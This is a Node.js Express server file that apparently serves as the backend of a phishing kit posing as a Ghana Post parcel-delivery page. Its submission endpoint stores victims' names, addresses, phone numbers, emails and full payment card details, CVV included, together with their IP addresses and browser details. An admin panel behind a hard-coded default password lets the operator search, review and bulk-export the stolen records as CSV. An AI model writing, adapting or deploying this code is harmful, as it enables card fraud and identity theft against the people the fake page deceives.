
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bcrypt = require('bcryptjs');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const bodyParser = require('body-parser');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

const JWT_SECRET = process.env.JWT_SECRET || 'your-super-secret-key-for-jwt-tokens';
const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'admin';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'ghanapost2024';

// Database setup
const db = new sqlite3.Database('./submissions.db', (err) => {
    if (err) {
        console.error(err.message);
    }
    console.log('Connected to the submissions database.');
});

// Create submissions table
db.run(`CREATE TABLE IF NOT EXISTS submissions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    packageNumber TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    fullName TEXT,
    phoneNumber TEXT,
    email TEXT,
    streetAddress TEXT,
    city TEXT,
    region TEXT,
    postalCode TEXT,
    country TEXT,
    cardholderName TEXT,
    cardNumber TEXT,
    expiryDate TEXT,
    cvv TEXT,
    status TEXT DEFAULT 'pending',
    ipAddress TEXT,
    userAgent TEXT
)`);

// Middleware to verify JWT
const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    if (token == null) return res.sendStatus(401); 

    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) return res.sendStatus(403);
        req.user = user;
        next();
    });
};

// --- API Endpoints ---

// POST /api/submissions - Save user data
app.post('/api/submissions', (req, res) => {
    const {
        packageNumber, fullName, phoneNumber, email, streetAddress, city, region,
        postalCode, country, cardholderName, cardNumber, expiryDate, cvv
    } = req.body;
    const ipAddress = req.ip;
    const userAgent = req.headers['user-agent'];

    const sql = `INSERT INTO submissions (
        packageNumber, fullName, phoneNumber, email, streetAddress, city, region,
        postalCode, country, cardholderName, cardNumber, expiryDate, cvv, ipAddress, userAgent
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`;

    const params = [
        packageNumber, fullName, phoneNumber, email, streetAddress, city, region,
        postalCode, country, cardholderName, cardNumber, expiryDate, cvv, ipAddress, userAgent
    ];

    db.run(sql, params, function(err) {
        if (err) {
            res.status(400).json({ "error": err.message });
            return;
        }
        res.json({
            "message": "success",
            "data": { id: this.lastID, ...req.body },
        });
    });
});

// GET /api/submissions - Get all submissions (admin only)
app.get('/api/submissions', authenticateToken, (req, res) => {
    const sql = "SELECT * FROM submissions ORDER BY timestamp DESC";
    db.all(sql, [], (err, rows) => {
        if (err) {
            res.status(400).json({ "error": err.message });
            return;
        }
        res.json({
            "message": "success",
            "data": rows
        });
    });
});

// GET /api/submissions/:id - Get single submission (admin only)
app.get('/api/submissions/:id', authenticateToken, (req, res) => {
    const sql = "SELECT * FROM submissions WHERE id = ?";
    db.get(sql, [req.params.id], (err, row) => {
        if (err) {
            res.status(400).json({ "error": err.message });
            return;
        }
        res.json({
            "message": "success",
            "data": row
        });
    });
});

// DELETE /api/submissions/:id - Delete a submission (admin only)
app.delete('/api/submissions/:id', authenticateToken, (req, res) => {
    const sql = "DELETE FROM submissions WHERE id = ?";
    db.run(sql, [req.params.id], function(err) {
        if (err) {
            res.status(400).json({ "error": err.message });
            return;
        }
        res.json({ "message": "deleted", "changes": this.changes });
    });
});

// PATCH /api/submissions/:id/status - Update submission status (admin only)
app.patch('/api/submissions/:id/status', authenticateToken, (req, res) => {
    const { status } = req.body;
    if (!['pending', 'completed', 'flagged'].includes(status)) {
        return res.status(400).json({ "error": "Invalid status" });
    }
    const sql = "UPDATE submissions SET status = ? WHERE id = ?";
    db.run(sql, [status, req.params.id], function(err) {
        if (err) {
            res.status(400).json({ "error": err.message });
            return;
        }
        res.json({ "message": "status updated", "changes": this.changes });
    });
});


// POST /api/admin/login - Admin authentication
app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;
    
    // Simple validation
    if (!username || !password) {
        return res.status(400).json({ "error": "Username and password required" });
    }
    
    if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
        const accessToken = jwt.sign({ username: username }, JWT_SECRET, { expiresIn: '24h' });
        res.json({ accessToken: accessToken, message: "Login successful" });
    } else {
        res.status(401).json({ "error": "Invalid credentials" });
    }
});

// GET /api/submissions/search - Search submissions (admin only)
app.get('/api/submissions/search', authenticateToken, (req, res) => {
    const { query, startDate, endDate } = req.query;
    let sql = "SELECT * FROM submissions WHERE 1=1";
    const params = [];
    
    if (query) {
        sql += " AND (fullName LIKE ? OR email LIKE ? OR phoneNumber LIKE ? OR packageNumber LIKE ?)";
        const searchTerm = `%${query}%`;
        params.push(searchTerm, searchTerm, searchTerm, searchTerm);
    }
    
    if (startDate) {
        sql += " AND timestamp >= ?";
        params.push(startDate);
    }
    
    if (endDate) {
        sql += " AND timestamp <= ?";
        params.push(endDate);
    }
    
    sql += " ORDER BY timestamp DESC";
    
    db.all(sql, params, (err, rows) => {
        if (err) {
            res.status(400).json({ "error": err.message });
            return;
        }
        res.json({ "message": "success", "data": rows });
    });
});

// GET /api/submissions/export/csv - Export submissions as CSV (admin only)
app.get('/api/submissions/export/csv', authenticateToken, (req, res) => {
    const sql = "SELECT * FROM submissions ORDER BY timestamp DESC";
    db.all(sql, [], (err, rows) => {
        if (err) {
            res.status(400).json({ "error": err.message });
            return;
        }
        
        if (rows.length === 0) {
            return res.json({ csv: "" });
        }
        
        // Create CSV header
        const headers = Object.keys(rows[0]);
        const csvContent = [
            headers.join(','),
            ...rows.map(row => 
                headers.map(header => {
                    const value = row[header];
                    // Escape quotes and wrap in quotes if contains comma
                    if (value && (value.toString().includes(',') || value.toString().includes('"'))) {
                        return `"${value.toString().replace(/"/g, '""')}"`;
                    }
                    return value || '';
                }).join(',')
            )
        ].join('\n');
        
        res.setHeader('Content-Type', 'text/csv');
        res.setHeader('Content-Disposition', 'attachment; filename=submissions.csv');
        res.send(csvContent);
    });
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
